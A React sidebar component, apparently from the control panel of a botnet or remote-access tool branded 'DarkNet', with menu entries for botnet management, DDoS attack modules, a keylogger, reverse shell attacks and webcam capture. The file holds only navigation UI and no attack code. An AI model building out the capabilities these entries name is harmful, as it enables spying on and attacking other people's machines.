import React, { useState } from 'react';
import { FaBars, FaTh } from 'react-icons/fa';
import { NavLink } from 'react-router-dom';

import DnsIcon from '@mui/icons-material/Dns';
import BugReportIcon from '@mui/icons-material/BugReport';
import HomeIcon from '@mui/icons-material/Home';
import VpnKeyIcon from '@mui/icons-material/VpnKey';
import ReplayIcon from '@mui/icons-material/Replay';
import CameraAltIcon from '@mui/icons-material/CameraAlt';
import HistoryIcon from '@mui/icons-material/History';

const Sidebar = ({children}) => {
    const [isOpen, setIsOpen] = useState(false);
    const toggle = () => setIsOpen(!isOpen);

    const menuItem = [
        {
            path: "/",
            name: "Dashboard",
            icon: <FaTh />
        },
        {
            path: "/botnetmanagement",
            name: "Botnet Management",
            icon: <DnsIcon />
            
        },
        {
            path: "/ddosattackmodules",
            name: "Ddos Attack Modules",
            icon: <BugReportIcon />
        },
        {
            path: "/filemanipulation",
            name: "File Manipulation",
            icon: <HomeIcon />
        },
        {
            path: "/keylogger",
            name: "Keylogger",
            icon: <VpnKeyIcon />
        },
        {
            path: "/reverseshellattack",
            name: "Reverse Shell Attack",
            icon: <ReplayIcon />
        },
        {
            path: "/webcam",
            name: "Webcam",
            icon: <CameraAltIcon />
        },
        {
            path: "/historylogs",
            name: "History",
            icon: <HistoryIcon />
        },
    ];

    return (
        <div className="container">
            <div style={{ width: isOpen ? "200px" : "50px" }} className="sidebar">
                <div className="top_section">
                    <h1 style={{ display: isOpen ? "block" : "none" }} className="logo">DarkNet</h1>
                    <div style={{ marginLeft: isOpen ? "50px" : "0px" }} className="bars">
                        <FaBars onClick={toggle} />
                    </div>
                </div>
                {
                    menuItem.map((item, index) => (
                        <NavLink to={item.path} key={index} className="link" activeClassName="active">
                            <div className="icon">{item.icon}</div>
                            <div style={{ display: isOpen ? "block" : "none" }} className="link_text">{item.name}</div>
                        </NavLink>
                    ))
                }
            </div>
            <main>{children}</main>
        </div>
    );
};

export default Sidebar;
